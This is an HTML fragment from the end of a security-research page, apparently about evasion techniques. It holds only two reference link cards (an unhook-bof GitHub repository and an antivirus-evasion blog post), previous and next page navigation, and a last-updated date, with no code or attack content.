group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_fl8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_fl8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://github.com/Cobalt-Strike/unhook-bof"><img alt="Logo" loading="lazy" src="https://www.netero1010-securitylab.com/~gitbook/image?url=https%3A%2F%2Fgithub.com%2Ffluidicon.png&amp;width=20&amp;dpr=3&amp;quality=100&amp;sign=da1c54e&amp;sv=2" class="w-5 h-5 block" width="512" height="512"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">GitHub - Cobalt-Strike/unhook-bof: Remove API hooks from a Beacon process.</span><span class="text-xs text-tint">GitHub</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_fn8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_fn8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 relative overflow-hidden after:block after:absolute after:-inset-0 rounded-corners:rounded-sm circular-corners:rounded-2xl after:border-tint-subtle after:border after:rounded circular-corners:after:rounded-2xl rounded-corners:after:rounded-sm dark:after:mix-blend-plus-lighter after:pointer-events-none"><a class="group flex flex-row justify-between items-center gap-4 ring-1 ring-tint-subtle rounded-sm straight-corners:rounded-none circular-corners:rounded-2xl px-5 py-3 transition-shadow hover:ring-primary-hover" href="https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/"><span class="flex flex-col flex-1"><span class="text-base transition-colors group-hover:text-primary">https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/</span><span class="text-xs text-tint">klezvirus.github.io</span></span><svg class="gb-icon size-3 text-tint transition-all group-hover:translate-x-0.5 group-hover:text-primary"><title>chevron-right</title><defs><mask id="_R_fp8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_fp8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div></div><div class="flex flex-col md:flex-row mt-6 gap-2 max-w-3xl page-width-wide:max-w-screen-2xl mx-auto text-tint"><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row-reverse items-center pl-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://www.netero1010-securitylab.com/"><span class="flex flex-col flex-1 text-right"><span class="text-xs">Previous</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">About Me</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-left</title><defs><mask id="_R_4qqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4qqav5ukqiv5ubsnpfivb_)"></rect></svg></a><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row items-center pr-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://www.netero1010-securitylab.com/evasion/alternative-process-injection"><span class="flex flex-col flex-1"><span class="text-xs">Next</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Alternative Process Injection</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-right</title><defs><mask id="_R_5aqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5aqav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto mt-6 page-api-block:ml-0 flex max-w-3xl page-full-width:max-w-screen-2xl flex-row flex-wrap items-center gap-4 text-tint contrast-more:text-tint-strong"><p class="mr-auto text-sm ">Last updated <time data-visual-test="transparent" datetime="2024-10-19T17:06:43.133Z" data-state="closed">1 year ago</time></p></div></main></div></div><!--$--><!--/$--></div></div></body></html>